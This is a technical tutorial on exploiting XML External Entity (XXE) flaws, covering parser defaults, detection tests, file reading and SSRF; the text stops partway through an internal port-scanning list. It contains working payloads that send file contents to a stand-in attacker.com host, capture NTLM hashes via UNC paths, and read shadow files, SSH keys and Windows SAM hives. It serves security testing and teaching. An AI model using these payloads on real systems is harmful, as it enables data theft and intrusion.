---
title: XXE Exploitation Knowledge Base
excerpt: |
  This is not a payload list. This is a deep-dive into how XXE works internally, with the goal of:
  
    - Building a mental model of XML parsing
    - Understanding why payloads work (not just using them)
    - Covering both fundamentals (for juniors) and advanced techniques (for experienced testers)
tags: XXE, XML, SSRF, LFI, OOB, DTD, Blind XXE, SOAP
---


# XML Fundamentals

Before diving into XXE exploitation it is important to understand the basics of XML and how parsers work. If you are already familiar with XML, DTDs and entity resolution you can skip this section and go straight to the [XXE Taxonomy](#xxe-taxonomy).

## What is XML

XML (eXtensible Markup Language) is a format for storing and transporting structured data. It looks similar to HTML, but unlike HTML, XML lets you define your own tags. Here is a simple XML document:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<user>
  <name>John Doe</name>
  <email>john@example.com</email>
  <role>admin</role>
</user>
```

The first line (`<?xml version="1.0" encoding="UTF-8"?>`) is the XML declaration. Everything else is structured data using custom tags. Applications use XML to exchange information between systems, store configuration files, define API requests and much more.

## What is an XML Parser

An XML parser is a piece of software that reads XML documents and makes their content available to the application. When a web application receives XML data (for example in an API request), it passes that data to the parser. The parser reads the XML document, checks its syntax and converts it into something the application can work with. For instance, when a Java server receives a POST request with `Content-Type: application/xml`, it typically passes the body to a parser like `DocumentBuilderFactory` to extract the data.

The key thing to understand is that the parser does not just read the data — it also **evaluates declarations** embedded in the XML document. This is where the security problem begins, because some of those instructions can tell the parser to read files from the server or make network requests. These instructions are called **entity declarations**, and will be covered in the following sections.

## What is a DTD

A DTD (Document Type Definition) is a set of rules that defines the structure of an XML document. DTDs are declared at the beginning of an XML document using the `<!DOCTYPE>` declaration. Inside the DTD you can define elements, attributes and **entities**.

```xml
<?xml version="1.0"?>
<!DOCTYPE note [
  <!ELEMENT note (to, from, message)>
  <!ELEMENT to (#PCDATA)>
  <!ELEMENT from (#PCDATA)>
  <!ELEMENT message (#PCDATA)>
]>
<note>
  <to>Alice</to>
  <from>Bob</from>
  <message>Hello</message>
</note>
```

In this example the DTD defines that a `note` element must contain `to`, `from` and `message` elements, and each of those contains text data (`#PCDATA`).

DTDs can be defined inline within the document or loaded from an external source — a distinction that becomes important when we explore advanced exploitation techniques.

## What are Entities

Entities are like variables in XML. You define them in the DTD and reference them in the document body. When the parser encounters an entity reference it replaces it with the entity's value.

```xml
<?xml version="1.0"?>
<!DOCTYPE greeting [
  <!ENTITY name "World">
]>
<greeting>Hello &name;!</greeting>
```

When parsed, `&name;` gets replaced with "World", so the result is "Hello World!".

There are two types of entities that matter for XXE:

**Internal entities** have their value defined directly in the DTD. The example above (`<!ENTITY name "World">`) is an internal entity. Nothing dangerous here.

**External entities** tell the parser to fetch their value from an outside source using the `SYSTEM` keyword:

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

This tells the parser: "go read the file `/etc/passwd` and use its contents as the value of this entity". This is where XXE attacks come from. If the parser obeys this instruction, the attacker can read any file the server has access to.

In XML, you can also declare external entities using the `PUBLIC` keyword instead of `SYSTEM`. The difference is that `PUBLIC` includes a formal public identifier that the parser can use to look up the resource in a local catalog, followed optionally by a URI as fallback — making it functionally equivalent to `SYSTEM` for XXE purposes. In practice, all XXE payloads use `SYSTEM` because it is simpler and more universally supported.

## What are Parameter Entities

Parameter entities are a special type of entity that can only be used inside DTD declarations (not in the document body). They are declared with `%` instead of just a name:

```xml
<!ENTITY % filename SYSTEM "file:///etc/passwd">
```

And they are referenced with `%filename;` instead of `&name;`:

```xml
%filename;
```

Why do they matter? Because parameter entities can define other entities. This creates a chain where one entity sets up another entity which sets up another. Here is a simplified example of how chaining works:

```xml
<!ENTITY % step1 SYSTEM "file:///etc/hostname">
<!ENTITY % step2 "<!ENTITY &#x25; step3 SYSTEM 'http://attacker.com/?data=%step1;'>">
%step2;
%step3;
```

What happens here: `%step1` is an external entity (the `SYSTEM` keyword makes it fetch the file instead of treating the value as a literal string), `%step2` creates a new entity that embeds the hostname into a URL, and `%step3` makes the parser visit that URL — sending the stolen data to the attacker. Don't worry about the `&#x25;` syntax for now — it is explained in detail in the [OOB section](#understanding-the-escape-characters).

This chaining ability is what makes advanced XXE techniques (like blind exfiltration and OOB attacks) possible.

## How Entity Resolution Creates the Vulnerability

When the parser encounters `<!ENTITY xxe SYSTEM "file:///etc/passwd">` followed by `&xxe;` in the document, it does the following:

1. Reads the DOCTYPE and registers the entity `xxe` with its SYSTEM identifier
2. When it encounters `&xxe;` in the document body, looks up the entity
3. If entity resolution is enabled, it sees the `SYSTEM` keyword and attempts to fetch `file:///etc/passwd`
4. Reads the file content and substitutes it in place of `&xxe;`
5. Continues parsing the document with the substituted content

The vulnerability is at step 3. The parser fetches whatever resource the entity points to without questioning whether it should. If the attacker controls the XML input, they control what the parser fetches.

-----

# Context of XXE

Many legacy and modern applications rely on the XML format to consume, store and manage data from several sources. Nowadays we have other and lighter ways of processing data like JSON, but due to the widespread adoption of XML many products still use it extensively. XML supports custom tags, DTD definitions and schema validation which makes it very flexible but also introduces attack surface through its entity resolution mechanism.

## What is it

An XML External Entity attack is a type of attack against an application that parses XML input containing external entity references, processed by a weakly configured XML parser. These external entities are defined by the attacker, and they can lead to several side effects like data exfiltration, Server-Side Request Forgery (SSRF), denial of service or even, in very specific scenarios, Remote Code Execution (RCE).

To understand the difference between a harmless entity and a dangerous one, compare these two examples:

**Internal entity (harmless):**

```XML
<?xml version="1.0" ?>
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```

Here the attacker is defining the entity "example", assigning the value "Doe" to it, and then reflecting it in the "lastName" element. Nothing leaves the server.

**External entity (dangerous):**

```XML
<?xml version="1.0" ?>
<!DOCTYPE replace [<!ENTITY example SYSTEM "file:///etc/passwd"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```

Here the attacker is defining "example" and assigning the content of "/etc/passwd" as the value. In an ideal situation the content of the file will be printed in the response. If the application does not return the content directly, other exfiltration techniques covered later in this KB can be used.

## Requirements

XXE attacks require the application to accept XML from uncontrolled sources and parse it in an insecure way. Historically, many XML parsers were insecure by default and require the developer to explicitly limit their capabilities by setting specific flags on the parser in order to make it secure. 

-----

# XXE Taxonomy

The following taxonomy classifies all XXE attack techniques covered in this KB. It serves both as a mental model for understanding how XXE exploitation works and as a navigational index. Techniques are grouped by their primary objective and sorted by difficulty/rarity within each category.

```
XXE ATTACK TAXONOMY
│
├── BY OBJECTIVE
│   ├── Data Exfiltration (read files, configs, secrets)
│   │   ├── [CORE]     Direct LFI ──────────────────── § Core Techniques > LFI
│   │   ├── [CORE]     Error-based exfiltration ────── § Core Techniques > Error-Based Blind XXE
│   │   ├── [CORE]     OOB via malicious DTD ───────── § Core Techniques > OOB Exfiltration
│   │   ├── [ADV]      Local DTD override ──────────── § Advanced > Repurposing Local DTDs
│   │   ├── [ADV]      DNS-based exfiltration ──────── § Advanced > DNS-Based OOB
│   │   └── [ADV]      PHP filter chains ───────────── § Advanced > PHP Wrappers
│   │
│   ├── Internal Reconnaissance (SSRF, service enum)
│   │   ├── [CORE]     SSRF to internal services ──── § Core Techniques > SSRF
│   │   ├── [INT]      SSRF via error messages ─────── § Core Techniques > Error-Based Blind XXE > Bonus
│   │   ├── [ADV]      Java LDAP/RMI SSRF ─────────── § Advanced > Java Protocols
│   │   └── [ADV]      UNC path NTLM capture ──────── § Core Techniques > LFI > Windows
│   │
│   ├── Environment-Specific Escalation (RCE — rare, stack-dependent)
│   │   ├── [ADV]      PHP expect:// wrapper ───────── § Advanced > PHP Wrappers
│   │   └── [ADV]      Java jar:// deserialization ── § Advanced > Java Protocols
│   │
│   └── Denial of Service
│       ├── [CORE]     Billion Laughs ──────────────── § Denial of Service
│       └── [CORE]     Quadratic Blowup ───────────── § Denial of Service
│
├── BY ENTRY POINT
│   ├── [CORE]     REST API (XML body) ─────────────── § Identifying XXE on REST APIs
│   ├── [INT]      SOAP endpoints ──────────────────── § Intermediate > SOAP
│   ├── [INT]      File upload (SVG/XLSX/DOCX) ─────── § Intermediate > File Upload
│   ├── [INT]      Content-Type switching ──────────── § Intermediate > Content-Type Switching
│   ├── [INT]      XInclude injection ──────────────── § Intermediate > XInclude
│   └── [ADV]      RSS/Atom feeds, WebDAV, XSLT ───── (context-dependent)
│
├── BY EXFILTRATION CHANNEL
│   ├── In-band ── response reflects entity content
│   ├── Error-based ── file content leaked in error messages
│   ├── OOB HTTP ── data sent to attacker server via HTTP
│   ├── OOB DNS ── data encoded in DNS queries
│   └── Side-channel ── behavioral differences (timing, status codes)
│
└── DIFFICULTY LEVELS
    ├── [CORE] ── Standard techniques, work on most vulnerable parsers
    ├── [INT]  ── Require specific context (SOAP, file formats, content negotiation)
    └── [ADV]  ── Require specific stack, rare conditions or complex payload crafting
```

**Legend**: `[CORE]` = common, first to try | `[INT]` = intermediate, context-dependent | `[ADV]` = advanced, rare conditions

-----

# Parser Behaviour

The [XML Fundamentals](#xml-fundamentals) section explains what entities are and how resolution works at a conceptual level. This section goes deeper into how different parsers implement entity resolution and why some are vulnerable while others are not.

## What Happens When Resolution Goes Wrong

As covered in the fundamentals, the parser resolves entities by fetching whatever resource the `SYSTEM` identifier points to. But what happens when the fetched content causes problems?

- If the file contains characters that are special in XML (`<`, `>`, `&`) the parser throws an error because the substituted content breaks the XML structure. This is why techniques like base64 encoding (php://filter) and error-based exfiltration exist — they work around this limitation.
- If the target file is binary (a compiled library, an image, a .jar archive) the parser will either fail or return garbled content. This is another reason why encoding wrappers like `php://filter/convert.base64-encode` are useful — they convert binary content to safe ASCII before the parser tries to process it.
- If the entity points to an HTTP URL, the parser makes an actual HTTP request to that URL. The response body replaces the entity. This is the foundation of both SSRF and OOB exfiltration.
- If the entity points to a resource that does not exist, the parser generates an error message that often includes the path it tried to resolve. Attackers exploit this behavior to leak data through error messages.

Understanding these failure modes is critical because many of the advanced techniques in this KB are built specifically to exploit them.

## Why Parsers Are (or Were) Vulnerable

Historically, many XML parsers shipped with external entity resolution enabled because the XML specification requires it for full DTD support. The spec was designed in an era where XML documents were trusted and the ability to include external resources was considered a feature not a risk.

In some ecosystems this is still the case. Java parsers in particular remain insecure by default and OWASP still documents that most common Java XML parsers must be explicitly hardened. However, modern runtimes in other languages have improved their defaults considerably: Python's `lxml` has been safe since version 5.0, .NET changed to secure defaults in 4.5.2, PHP requires explicit `LIBXML_NOENT` flag to enable entity substitution, and Ruby's Nokogiri treats documents as untrusted by default.

This means the vulnerability is an opt-out problem in some stacks (Java) but closer to opt-in in others (modern PHP, Python, .NET). The practical implication for pentesting is that the technology stack matters a lot when assessing XXE likelihood. Legacy applications and older framework versions remain the most common targets.

## Parser Behaviour by Language

Different parsers behave differently. Some are vulnerable by default, some require specific flags to become vulnerable, and some have been hardened over time:

**Java** — All Java native (JAXP) parsers are vulnerable by default and must be hardened explicitly.

|Parser                  |External Entities|Parameter Entities|DTD Processing|Risk Assessment                                      |
|------------------------|-----------------|------------------|--------------|-----------------------------------------------------|
|`DocumentBuilderFactory`|✅ On by default  |✅ On by default   |✅ On          |Vulnerable by default — must be hardened explicitly   |
|`SAXParserFactory`      |✅ On by default  |✅ On by default   |✅ On          |Vulnerable by default — must be hardened explicitly   |
|`XMLReader`             |✅ On by default  |✅ On by default   |✅ On          |Vulnerable by default — must be hardened explicitly   |

**Python** — Defaults vary significantly by parser.

|Parser                 |External Entities      |Parameter Entities|DTD Processing|Risk Assessment                                          |
|-----------------------|-----------------------|------------------|--------------|---------------------------------------------------------|
|`lxml` (etree)         |❌ Off by default       |❌ Off             |✅ On          |Usually safe — secure defaults since 5.0                 |
|`xml.etree.ElementTree`|❌ Off by default       |❌ No              |❌ No          |Usually safe — limited parser, relies on expat           |
|`xml.dom.minidom`      |⚠️ Depends on SAX config|❌ No              |⚠️ Partial     |Version-dependent — underlying SAX parser behavior varies|

**PHP** — External entities require explicit opt-in via `LIBXML_NOENT`.

|Parser       |External Entities          |Parameter Entities|DTD Processing|Risk Assessment                                            |
|-------------|---------------------------|------------------|--------------|-----------------------------------------------------------|
|`SimpleXML`  |⚠️ Off unless `LIBXML_NOENT`|❌ Off             |✅ On          |Requires insecure flags — safe unless developer enables it |
|`DOMDocument`|⚠️ Off unless `LIBXML_NOENT`|❌ Off             |✅ On          |Requires insecure flags — safe unless developer enables it |

**.NET** — Defaults changed in version 4.5.2.

|Parser       |External Entities        |Parameter Entities|DTD Processing|Risk Assessment                                                            |
|-------------|-------------------------|------------------|--------------|---------------------------------------------------------------------------|
|`XmlDocument`|⚠️ Changed across versions|⚠️ Varies          |✅ On          |Version-dependent — < 4.5.2 vulnerable, ≥ 4.5.2 safe unless XmlResolver set|
|`XDocument`  |❌ Off by default         |❌ Off             |✅ On          |Usually safe — since .NET 4.5.2                                            |

**Ruby** — Both parsers default to safe behavior.

|Parser    |External Entities|Parameter Entities|DTD Processing|Risk Assessment                                        |
|----------|-----------------|------------------|--------------|-------------------------------------------------------|
|`Nokogiri`|❌ Off by default |❌ Off             |✅ On          |Usually safe — treats documents as untrusted by default|
|`REXML`   |⚠️ Partial support|❌ No              |⚠️ Partial     |Version-dependent — partial and inconsistent support   |

**C/C++** — libxml2 requires explicit flags to enable entity resolution.

|Parser   |External Entities     |Parameter Entities|DTD Processing|Risk Assessment                                           |
|---------|----------------------|------------------|--------------|----------------------------------------------------------|
|`libxml2`|⚠️ Off unless flags set|⚠️ Off unless flags|✅ On          |Requires insecure flags — `XML_PARSE_NOENT` or similar    |

Key observations from a pentesting perspective:

- Historically Java XML parsers have required explicit hardening and many frameworks still rely on insecure defaults. If the target runs Java, XXE should be high on the testing list.
- PHP requires the `LIBXML_NOENT` flag to enable entity substitution. The vulnerability often comes from developers explicitly enabling it or from legacy code that predates current best practices.
- .NET changed defaults in version 4.5.2. Applications running on older .NET frameworks or using custom `XmlResolver` configurations are likely vulnerable.
- Python's `lxml` has been safe by default for years but `xml.dom.minidom` behavior depends on the underlying SAX parser configuration which may vary.
- Ruby's Nokogiri treats documents as untrusted by default, making XXE unlikely unless the developer overrides this behavior.

## Protocols Supported by Parsers

Not all parsers support the same protocols. This directly affects what techniques are available:

|Protocol   |Java  |PHP           |.NET|Python|Ruby|
|-----------|------|--------------|----|------|----|
|`file://`  |✅     |✅             |✅   |✅     |✅   |
|`http://`  |✅     |✅             |✅   |✅     |✅   |
|`https://` |✅     |✅             |✅   |✅     |✅   |
|`ftp://`   |✅     |✅             |⚠️   |❌     |❌   |
|`jar://`   |✅     |❌             |❌   |❌     |❌   |
|`netdoc://`|⚠️ Old JDKs |❌             |❌   |❌     |❌   |
|`php://`   |❌     |✅             |❌   |❌     |❌   |
|`expect://`|❌     |⚠️ Extension   |❌   |❌     |❌   |
|`data://`  |❌     |✅             |❌   |❌     |❌   |
|`gopher://`|❌     |⚠️ Legacy / extension-specific|❌   |❌     |❌   |

Java has the broadest protocol support which is why Java-specific techniques (jar://, netdoc://, LDAP, RMI) exist. PHP has its own set of wrappers (php://, expect://, data://) that are unique to that ecosystem.

### Notes on protocols

- ftp:// : Modern .NET does not include native FTP support, as the built-in classes (`FtpWebRequest` and `WebClient`) have been deprecated from the core framework. Third-party libraries like `FluentFTP` can be used as a full-featured replacement for FTP communication. Regarding XXE exploitation, leveraging the FTP protocol is extremely difficult in modern .NET. However, legacy .NET (**.NET Framework 4.x** and **.NET Core 3.1** and earlier) internally uses `WebRequest` inside `XmlUrlResolver`, which can successfully resolve FTP URLs and therefore makes FTP-based XXE attacks feasible in those environments.
- gopher:// : Gopher support in PHP should be treated as a legacy or environment-dependent capability rather than a standard feature of modern PHP. Current PHP documentation no longer lists `gopher://` among the built-in stream wrappers, while legacy Gopher support such as `Net_Gopher` exists as an unmaintained PECL extension rather than as a maintained core feature. Separately, PHP’s cURL extension may still expose `GOPHER`/`GOPHERS` when the underlying libcurl build supports those protocols, but that is distinct from the built-in stream-wrapper and libxml loading path typically relevant to XXE parser behavior. In practice, PHP 7.4 serves as a useful cutoff point because its stream wrapper compatibility changes — especially the `stream_set_option()` behavior during `include/require` — broke or degraded many legacy wrappers. As a result, Gopher-based XXE is best considered feasible only in older or specially configured PHP environments, not as a generally available technique in modern PHP.
- netdoc:// : The `netdoc://` protocol is a Java-internal alternative to `file://`, functionally equivalent for reading local files and occasionally used in XXE payloads to bypass WAF rules that block `file://` patterns. Oracle states that `netdoc` protocol is designed to handle network documents, but it can access local files like `/etc/passwd`. However, the `netdoc` protocol handler was officially removed in **JDK 9**. As a result, leveraging `netdoc://` in XXE exploitation is only feasible in legacy Java environments running **JDK 8 and earlier**.
- expect:// : The `expect://` wrapper is not a built-in PHP feature but part of the **PECL expect extension**, which must be explicitly installed and is disabled by default. When active, it allows executing system commands directly from an XML entity, making it a particularly dangerous vector that can escalate XXE to **Remote Code Execution (RCE)**. Due to its non-default nature, this attack surface is rare in practice and fully dependent on whether the target environment has the extension installed.

-----

# XXE Exploitation Model

The following diagram represents the full exploitation model for XXE attacks. It starts from initial detection and branches into different techniques based on what the application allows and how it responds. Use this as a decision map during testing.

## Decision Tree

```mermaid
%%{init: {'theme': 'base', 'flowchart': {'rankSpacing': 60, 'nodeSpacing': 40}}}%%
graph LR

    A[Application accepts XML?] -->|Yes| B[Entity processing enabled?\nTest with basic entity]

    B -->|Reflected| C[IN-BAND XXE]
    B -->|Error only| D[ERROR-BASED XXE]
    B -->|Nothing| E[BLIND XXE]

    C --> F[LFI\nfile://]
    C --> G[SSRF\nhttp://internal]
    F --> F1[Unix files]
    F --> F2[Windows files\n+ UNC]
    F2 --> F3[Special chars\nin file?]
    F3 --> F4[CDATA wrap]
    F3 --> F5[php://filter\nbase64]
    G --> G1[Internal\nservices enum]

    D --> D1[Error msg\nhas file contents]
    D1 --> D2[Local DTD override\nfonts.dtd · docbook.dtd]
    D --> D3[SSRF via\nerror messages]

    E --> E1[OOB HTTP\nto own server]
    E --> E2[OOB DNS\nif HTTP blocked]
    E --> E3[Side-channel\ntiming / status]
    E1 --> E1a[Burp Collaborator]
    E1 --> E1b[HTTP listener]
```

## Entry Points

```mermaid
%%{init: {'theme': 'base', 'flowchart': {'rankSpacing': 60, 'nodeSpacing': 40}}}%%
graph LR

    EP[ENTRY POINTS]
    EP --> EP1[REST API\ndirect XML]
    EP --> EP2[File Upload\nSVG / XLSX / DOCX]
    EP --> EP3[XInclude\nno DOCTYPE]
    EP --> EP4[SOAP\nBody / Header]
    EP --> EP5[Content-Type\nswitching]
    EP --> EP6[RSS / Atom\nfeeds]
```

## Language-Specific

```mermaid
%%{init: {'theme': 'base', 'flowchart': {'rankSpacing': 60, 'nodeSpacing': 40}}}%%
graph LR

    LS[LANGUAGE-SPECIFIC]
    LS --> LS1[PHP\nexpect:// · php://filter\ndata:// · zip://]
    LS --> LS2[Java\njar:// · netdoc://\nLDAP · RMI]
    LS --> LS3[.NET\nUNC NTLM capture]
```

## Denial of Service

```mermaid
%%{init: {'theme': 'base', 'flowchart': {'rankSpacing': 60, 'nodeSpacing': 40}}}%%
graph LR

    DOS[DENIAL OF SERVICE]
    DOS --> DOS1[Billion Laughs\nrecursive expansion]
    DOS --> DOS2[Quadratic Blowup\nrepeated references]
```

-----

# Identifying XXE

## When to Suspect XXE

Before diving into payloads, it helps to know when XXE testing is worth prioritizing. These are the most common real-world scenarios where XXE shows up:

- APIs that accept structured data in XML format (REST, SOAP)
- SAML-based authentication workflows (SSO implementations)
- Document conversion pipelines (PDF generators, report engines)
- File upload endpoints that process SVG, XLSX, DOCX or other XML-based formats
- Configuration import features (XML config files, backup restores)
- RSS/Atom feed aggregation systems
- Any legacy enterprise system that predates JSON adoption

If the target matches any of these patterns and especially if it runs Java, it is worth spending time on XXE testing.

**Tip:** If the API only accepts JSON, do not give up immediately. Try sending an XML payload with `Content-Type: application/json` — some frameworks parse the body based on content rather than the declared content-type. This technique is covered in [Content-Type Switching](#content-type-switching).

## Testing on REST APIs

The most reliable way to confirm XXE is by triggering entity resolution. To minimize the risk of information leaks and damage to the server we can start by reflecting a string from an internal entity to confirm entity processing, then escalate to reading a harmless file.

Some scenarios would require further testing since the entry point of the attack would not properly reflect our payload in the response. In these cases we can rely on errors coming from the application to identify the exploitability.

### Test 1: Simple Entity Reflection

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY test "SUCCESS">
]>
<root>
  <data>&test;</data>
</root>
```

The behavior expected with this payload would be that the response contains "SUCCESS" confirming that entity processing is enabled.

### Test 2: File Inclusion (Safe File)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root>
  <data>&xxe;</data>
</root>
```

The behavior expected with this payload would be that the response contains the system hostname confirming file read capabilities.

### Test 3: Protocol Error

But if the response does not return anything or it does not contain the expected data we can try to send a malformed entity to trigger a protocol error:

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "sdjsd:///etc/passwd"> ]>
<contacts>
  <contact>
    <name>Jean &xxe; Dupont</name>
    <phone>00 11 22 33 44</phone>
    <address>42 rue du CTF</address>
    <zipcode>75000</zipcode>
    <city>Paris</city>
  </contact>
</contacts>
```

In a real exploitation use case, this payload triggered an "Unknown protocol: sdjsd". This confirms that the parser is attempting to resolve the SYSTEM identifier in the entity declaration.

### Test 4: Malformed URL Error

Additionally, we can also trigger errors by malforming the resource declaration as follows:

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "http:/Attacker server"> ]>
<contacts>
  <contact>
    <name>Jean &xxe; Dupont</name>
    <phone>00 11 22 33 44</phone>
    <address>42 rue du CTF</address>
    <zipcode>75000</zipcode>
    <city>Paris</city>
  </contact>
</contacts>
```

In this case we can see that the URL is malformed and in the same real exploitation use case the target application returned "protocol = http host = null" meaning that the entity got properly resolved.

### Test 5: OOB Callback

Another method worth trying (but noisier than the ones above) is a basic OOB connection to a server controlled by us. In this scenario we may face some limitations due to possible network restrictions (firewall blocking connections to external sources, SIEM detections, etc):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/callback">
]>
<root>&xxe;</root>
```

### Behavioral Analysis (No Error Output)

The last and most extreme case would be that the target application does not return any error information at all and does not print the injected entities in the response. In this case we can either try an OOB connection or analyze the application behavior. Let's say the target returns 200 OK with the legitimate request and when trying to exfiltrate `/etc/passwd` returns nothing but 200 OK. The most common behavior will be that if the malicious XML triggers an error we see a 500 error. At this step we have to be very careful to avoid errors resulting from XML syntax errors. With a well-formed XML structure we can ensure that the errors come from the malicious actions we define.

Pattern to look for:

1. Well-formed benign XML → Returns 200 OK with normal response
2. XML with syntax errors → Returns 500 error
3. XXE with syntax errors → Returns 500 error
4. XXE with valid syntax → Returns 200 OK (but no output)

If you observe this pattern with well-formed XXE payloads, the vulnerability is likely blind XXE. Proceed with local DTD enumeration, error-based exfiltration or OOB data exfiltration.

### Identification Decision Tree

```
Does the application accept XML input?
├─ No → Not vulnerable to XXE (move to other vectors)
└─ Yes
   │
   Does the application parse the XML?
   ├─ No → Not vulnerable to XXE
   └─ Yes
      │
      Can you inject custom XML structures?
      ├─ No → Likely using fixed XML templates (low XXE risk)
      └─ Yes
         │
         Test 1: Submit basic entity
         ┌─────────────────────────────────────┐
         │ <!ENTITY test "value">              │
         │ <root>&test;</root>                 │
         └─────────────────────────────────────┘
         │
         Does "value" appear in response?
         ├─ Yes → Application process untrusted user input → Proceed with LFI/SSRF
         ├─ No → Go to Test 2
         └─ Error response → Vulnerable to error-based XXE
            │
            Test 2: External file entity
            ┌─────────────────────────────────────┐
            │ <!ENTITY xxe SYSTEM                 │
            │   "file:///etc/passwd">             │
            │ <root>&xxe;</root>                  │
            └─────────────────────────────────────┘
            │
            Is /etc/passwd content reflected?
            ├─ Yes → Vulnerable to LFI → Extract sensitive files
            ├─ No → Go to Test 3
            └─ Error with filename → Vulnerable error-based XXE
               │
               Test 3: SSRF test (local service)
               ┌─────────────────────────────────────┐
               │ <!ENTITY xxe SYSTEM                 │
               │   "http://127.0.0.1:8080/">         │
               └─────────────────────────────────────┘
               │
               Does request appear in logs?
               ├─ Yes → Vulnerable to SSRF
               ├─ No → Go to Test 4
               └─ Delayed response → Possible blind XXE
                  │
                  Test 4: OOB callback
                  ┌─────────────────────────────────────┐
                  │ <!ENTITY xxe SYSTEM                 │
                  │   "http://attacker.com/callback">   │
                  └─────────────────────────────────────┘
                  │
                  Did you receive a callback?
                  ├─ Yes → Vulnerable to blind XXE (OOB)
                  ├─ No → Test 5: XInclude
                  └─ Firewall blocking → Try DNS-based OOB
                     │
                     Test 5: XInclude (no DOCTYPE)
                     ┌─────────────────────────────────────┐
                     │ <root xmlns:xi=                     │
                     │   "http://www.w3.org/2001/XInclude">│
                     │   <xi:include href=                 │
                     │     "file:///etc/passwd"            │
                     │     parse="text"/>                  │
                     │ </root>                             │
                     └─────────────────────────────────────┘
                     │
                     Is file content reflected?
                     ├─ Yes → Vulnerable via XInclude
                     ├─ No → Likely NOT vulnerable to XXE
                     └─ DTD-based protections in place
                        Try advanced techniques:
                        - Local DTD enumeration
                        - Error-based exfiltration
                        - Time-based side-channel detection
```

-----

# Core Techniques

These are the standard XXE exploitation techniques. They work on most vulnerable parsers and should be the first ones to try.

## Local File Inclusion (LFI)

XML LFI payloads usually result in the application returning the contents of the file requested.

```XML
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

In this payload, the entity "xxe" will return the content of the file `/etc/passwd` since it is referenced below the definition in the element foo. Depending on the context this may not result in data exfiltration since it depends on how the application returns data.

##### Note on encoding
The payload above uses `ISO-8859-1` instead of `UTF-8`. This is intentional — some system files contain characters outside the ASCII range but within the Latin-1 charset. Declaring `ISO-8859-1` prevents the parser from failing when it encounters those characters during entity substitution. For files that are pure ASCII, `UTF-8` works equally well.


### Common Unix/Linux files

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">          <!-- User accounts -->
<!ENTITY xxe SYSTEM "file:///etc/shadow">          <!-- Password hashes (requires root — rarely readable) -->
<!ENTITY xxe SYSTEM "file:///etc/hosts">           <!-- Hostname mappings -->
<!ENTITY xxe SYSTEM "file:///etc/hostname">        <!-- System hostname -->
<!ENTITY xxe SYSTEM "file:///proc/self/environ">   <!-- Environment variables -->
<!ENTITY xxe SYSTEM "file:///proc/net/arp">        <!-- ARP table -->
<!ENTITY xxe SYSTEM "file:///home/user/.ssh/id_rsa">  <!-- SSH private keys -->
<!ENTITY xxe SYSTEM "file:///var/log/apache2/access.log">  <!-- Application logs -->
```

### LFI on Windows

Windows requires different file path syntax and targets different files. Additionally Windows supports UNC paths for network file access which can be exploited to enumerate network shares, force NTLM authentication attempts and capture NTLMv2 hashes:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///\\attacker.com\share\file.txt">
]>
<foo>&xxe;</foo>
```

Windows specific files:

```xml
<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/config/SAM">    <!-- User hashes (requires SYSTEM) -->
<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/config/SECURITY">  <!-- DPAPI keys (requires SYSTEM) -->
<!ENTITY xxe SYSTEM "file:///C:/boot.ini">                          <!-- Legacy Windows -->
<!ENTITY xxe SYSTEM "file:///C:/inetpub/wwwroot/web.config">       <!-- IIS configuration -->

<!-- UNC path enumeration -->
<!ENTITY xxe SYSTEM "file:///\\192.168.1.100\c$\Windows\System32\drivers\etc\hosts">
<!ENTITY xxe SYSTEM "file:///\\dc.example.com\SYSVOL\example.com\Policies\">
```

Some notes on Windows paths: use forward slashes even on Windows (`file:///C:/path/to/file`) since backslashes are not valid characters in URIs (RFC 3986) and some parsers handle them inconsistently. UNC paths use `file:///\\server\share\file`. Some parsers also support alternate data streams: `file:///C:/path/file.txt:zone.identifier`. This works because the parser passes the path to the operating system, which resolves the ADS syntax natively on NTFS filesystems.

##### Note on UNC path syntax
The forward slash rule applies to local Windows file paths (`file:///C:/path/to/file`). UNC paths are an exception — they require the double backslash notation (`\\server\share\file`) because that is how the UNC convention is defined. Some parsers also accept forward slash equivalents (`file:////server/share/file`), but backslash notation is more broadly supported for UNC across Java-based parsers.


## Server Side Request Forgery (SSRF)

Server-Side Request Forgery (SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make requests to unintended locations. This can lead to unauthorized actions or access to data within the organization and provides the attacker with the ability of fingerprinting other services running internally.

The basic SSRF payload makes the parser request an internal URL:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
]>
<foo>&xxe;</foo>
```

If the entity content is reflected in the response, the attacker can read the response from internal services. This turns XXE into a proxy for accessing services that are not exposed to the internet.

### Internal Service Discovery

SSRF through XXE is not limited to reading a single URL. By varying the port and host in the entity declaration, attackers can map out the internal network:

```xml
<!-- Port scanning common services -->
<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">      <!-- HTTP -->
<!ENTITY xxe SYSTEM "http://127.0.0.1:443/">     <!-- HTTPS -->
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">    <!-- Alt HTTP / Tomcat -->
